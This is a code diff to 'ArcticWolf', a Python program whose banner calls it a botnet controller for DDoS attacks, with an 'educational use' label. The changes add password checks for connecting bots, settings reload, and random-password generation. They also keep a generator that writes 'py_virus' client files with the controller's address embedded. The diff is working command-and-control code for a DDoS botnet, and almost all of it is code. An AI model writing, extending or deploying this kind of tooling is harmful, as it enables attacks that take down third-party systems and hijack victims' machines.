@@ -48,7 +48,7 @@ if system_type == 'Windows':
         from colorama import init,Fore,Back,Style
         init(autoreset=True) 
     except ImportError:
-            print_warn('colorma library import failed, print with color may be error')
+            print_warn('Colorma library import failed, print with color may be error')
 def post_cmd():
     '''main method to input command'''
     def gen_py(mode : str):
@@ -66,11 +66,20 @@ def post_cmd():
                 py_txt = ''.join(a[head:-1])
             return py_txt
         print_normal("Copying source......")
-        py_txt = delete_lines('Resource/client_source.py', 8) #Varies with the number of Settings!!!
+        py_txt = delete_lines('Resource/client_source.py', 9) #Varies with the number of Settings!!!
         name = "py_virus" + str(randint(100000, 900000))
         with open(name+'.py', "w") as fw:
             # write the settings to the virus
-            print_normal('Using config ./Data/settings.json')
+            print_normal('Using config loaded from ./Data/settings.json')
+            if settings_data['BotNet']['Password'] == '':
+                print_warn('Password is empty, using random password')
+                random_str =''
+                base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
+                length =len(base_str) -1
+                for i in range(16): # Random password (16 length)
+                    random_str += base_str[randint(0, length)]
+                change_password(random_str)
+            fw.write(f"Password = '{Password}'\n")
             fw.write(f"address = '{frpip}'\n")
             fw.write(f"port = {frpport}\n")
             fw.write(f'mode = "{mode}"\n')
@@ -82,6 +91,31 @@ def post_cmd():
             fw.write(py_txt)
         print_good(f"{name+'.py'} virus generated successfully")
         return name
+    def reload():
+        '''Method to reload the settings'''
+        global settings_data, buffsize, last_Heartbeat, Password
+        Heartbeat_open_before = settings_data['BotNet']['Heartbeat']
+        with open("./Data/settings.json", 'r') as f:
+            settings_data = json.load(f)
+        if settings_data['BotNet']['Heartbeat'] and not Heartbeat_open_before: # check if the heartbeat system is opened
+            print_normal('Heartbeat system started')
+            last_Heartbeat = {}
+            threading.Thread(target=tcplink, args=()).start()
+        buffsize = settings_data['BotNet']['Buffsize']
+        if settings_data['BotNet']['Password'] != Password:
+            print_warn(f'Password change from {Password} to {settings_data["BotNet"]["Password"]}')
+            Password = settings_data['BotNet']['Password']
+        print_normal('Settings data reloaded')
+    def change_password(new_password : str):
+        '''Method for changing password of the botnet'''
+        global Password
+        with open('Data/settings.json', 'w') as f: # clear the old setting file
+            settings_data['BotNet']['Password'] = new_password
+            json.dump(settings_data, f)
+            f.flush()
+            print_warn(f'New password : {new_password}')
+            Password = new_password
+            reload()
     while True:
         command = input('ArcticWolf: >>> ')
         if command == 'ol_num':
@@ -103,19 +137,15 @@ def post_cmd():
                     num += 1
         elif command == "info":
             # info of this host
-            print_machine_info()
+            host_name = socket.gethostname()
+            print_normal("Attack host info:")
+            print_normal(f"Host name: {host_name}", False)
+            print_normal(f"IP address: {ip}", False)
+            print_normal(f"PORT number: {port}", False)
+            print_normal(f"Botnet Password: '{Password}'", False)
+            print_normal(f'Botnet online number: {len(datasock_list)}', False)
         elif command == 'reload':
-            global settings_data, buffsize, last_Heartbeat
-            # reload the settings
-            Heartbeat_open_before = settings_data['BotNet']['Heartbeat']
-            with open("./Data/settings.json", 'r') as f:
-                settings_data = json.load(f)
-            if settings_data['BotNet']['Heartbeat'] and not Heartbeat_open_before: # check if the heartbeat system is opened
-                print_normal('Heartbeat system started')
-                last_Heartbeat = {}
-                threading.Thread(target=tcplink, args=()).start()
-            buffsize = settings_data['BotNet']['Buffsize']
-            print_normal('Settings data reloaded')
+            reload()
         elif command == 'clear_history':
             global history_file
             history_file.truncate(0)
@@ -219,13 +249,7 @@ def post_cmd():
             continue
         else:
             print_error(f'Unknown command {command}, You can type help to receive instructions')
-# print info
-def print_machine_info():
-    host_name = socket.gethostname()
-    print_normal("Attack host info:")
-    print_normal("Host name: %s" % host_name, False)
-    print_normal("IP address: %s" % ip, False)
-    print_normal("PORT number: %s" % port, False)
+
 # write message to the log file
 def History_write(string, _type='I'):
     global history_file
@@ -264,24 +288,36 @@ def tcplink():
             pass
 def run():
     '''main method to accept connection'''
+    def connect(clientsock, clientaddress):
+        '''Method for those whose password is correct'''
+        clientsock.send('OK'.encode('utf8'))
+        biggest_No = 0
+        for No in datasock_list.keys():
+            if int(No) > biggest_No:
+                biggest_No = int(No)
+        biggest_No += 1
+        Beep(440, 100)
+        History_write(f'Bot connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}')
+        print_good(f"Bot No.{biggest_No} connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}", line_break=True)
+        last_Heartbeat[clientsock] = time.time()
+        if clientsock not in datasock_list:
+            datasock_list[biggest_No] = clientsock
     while True:
         clientsock, clientaddress = s.accept()
+        # Check whether the connection target is an ArcticWolf bot
         clientsock.send('ArcticBotCheck'.encode('utf8')) # send checking message
-        if clientsock.recv(buffsize).decode('utf8') == 'CheckOK':
-            biggest_No = 0
-            for No in datasock_list.keys():
-                if int(No) > biggest_No:
-                    biggest_No = int(No)
-            biggest_No += 1
-            Beep(440, 100)
-            History_write(f'Bot connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}')
-            print_good(f"Bot No.{biggest_No} connected, {clientaddress[0]} : {clientaddress[1]} --->>> {ip} : {port}", line_break=True)
-            last_Heartbeat[clientsock] = time.time()
-            if clientsock not in datasock_list:
-                datasock_list[biggest_No] = clientsock
+        send_pwd = clientsock.recv(buffsize).decode('utf8') # recv password 
+        if send_pwd == Password: 
+            connect(clientsock, clientaddress)
         else:
-            clientsock.close()
-            del clientsock # Check whether the connection target is an ArcticWolf bot
+            print_warn(f'A bot connect from {clientaddress[0]} : {clientaddress[1]} with wrong Password : {send_pwd}')
+            choice = input('Accept it?[y/n]: >>> ') or 'n'
+            if choice == 'y':
+                connect(clientsock, clientaddress)
+            else:
+                print_normal(f'refused connect from {clientaddress[0]} : {clientaddress[1]}\n')
+                clientsock.close()
+                del clientsock
 
 
 
@@ -379,7 +415,7 @@ if __name__ == '__main__':
 
 [ArcticWolf] : A botnet controller for Ddos attacks using frp (without server)
 ---------------------------------------------------------------------------
-[Version] : v0.1.4.2     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
+[Version] : v0.1.5     [Author] : D0WE1LIN    ONLY FOR EDUCATIONAL USE!  
 
 ===========================================================================
 
@@ -399,14 +435,12 @@ if __name__ == '__main__':
         print_normal("Initializing......")
         mkdir("./Data") #Create the data folder
         default_settings_dict = { # Default Settings folder
-            'Attack' : {
-            'Botmaster_attacks' : False
-            },
             'BotNet' : {
                 'Default_ip' : '127.0.0.1',
                 'Default_port' : 6240,
                 'Heartbeat' : True,
-                'Buffsize' : 512
+                'Buffsize' : 512,
+                'Password' : ''
             },
             'Bots' : {
                 'Threads_num' : 10,
@@ -430,7 +464,8 @@ if __name__ == '__main__':
     port = check_input("port", "int_mode")
     frpip = check_input("frp_ip", "ip_mode")
     frpport = check_input("frp_port", "int_mode")
-    buffsize = settings_data['BotNet']['Buffsize']
+    buffsize = settings_data['BotNet']['Buffsize'] # Buffsize
+    Password = settings_data['BotNet']['Password'] # Password of the botnet
     print_warn("You must make sure that this host is on at anytime to recive connection")
     print_normal(f"Start listening on {ip} : {port}")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
